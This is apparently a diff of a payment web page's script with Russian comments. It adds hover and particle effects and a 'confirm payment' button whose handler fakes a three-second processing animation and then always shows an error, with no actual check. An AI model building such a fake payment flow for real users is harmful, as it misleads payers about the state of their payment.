-            document.getElementById('counterValue').textContent = formattedNumber + '+';
+            payButton.addEventListener('mouseenter', function() {
+                this.style.animation = 'pulse 1s infinite';
+            });
             
-            // Добавляем анимацию
-            const counter = document.getElementById('trustCounter');
-            counter.classList.add('animate__animated', 'animate__pulse');
-            setTimeout(() => {
-                counter.classList.remove('animate__animated', 'animate__pulse');
-            }, 1000);
-        }
-        
-        // Обновляем счётчик каждые 5 секунд
-        setInterval(animateCounter, 20000);
-        
-        // Инициализация при загрузке
-        document.addEventListener('DOMContentLoaded', animateCounter);
+            payButton.addEventListener('mouseleave', function() {
+                this.style.animation = '';
+            });
+            
+            // Добавляем дополнительные частицы на фон
+            const particlesContainer = document.querySelector('.particles');
+            for (let i = 0; i < 10; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                // Случайные размер и позиция
+                const size = Math.random() * 20 + 5;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                particle.style.top = `${Math.random() * 100}%`;
+                particle.style.left = `${Math.random() * 100}%`;
+                
+                // Случайная задержка анимации
+                particle.style.animationDelay = `${Math.random() * 5}s`;
+                particle.style.animationDuration = `${10 + Math.random() * 10}s`;
+                
+                particlesContainer.appendChild(particle);
+            }
+            
+            // Обработка нажатия на кнопку подтверждения оплаты
+            const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
+            const paymentConfirmation = document.getElementById('paymentConfirmation');
+            const paymentError = document.getElementById('paymentError');
+            const progressFill = document.getElementById('progressFill');
+            const refreshPageBtn = document.getElementById('refreshPageBtn');
+            
+            confirmPaymentBtn.addEventListener('click', function() {
+                // Показываем анимацию подтверждения
+                paymentConfirmation.classList.add('active');
+                
+                // Запускаем прогресс-бар
+                setTimeout(function() {
+                    progressFill.style.width = '100%';
+                }, 100);
+                
+                // Через 3 секунды скрываем анимацию и показываем ошибку
+                setTimeout(function() {
+                    paymentConfirmation.classList.remove('active');
+                    progressFill.style.width = '0%';
+                    
+                    // Показываем окно с ошибкой
+                    setTimeout(function() {
+                        paymentError.classList.add('active');
+                    }, 500);
+                }, 3000);
+            });
+            
+            // Обработка нажатия на кнопку обновления страницы
+            refreshPageBtn.addEventListener('click', function() {
+                // Обновляем страницу
+                location.reload();
+            });
+        });
     </script>
 </body>
 </html>
-
-
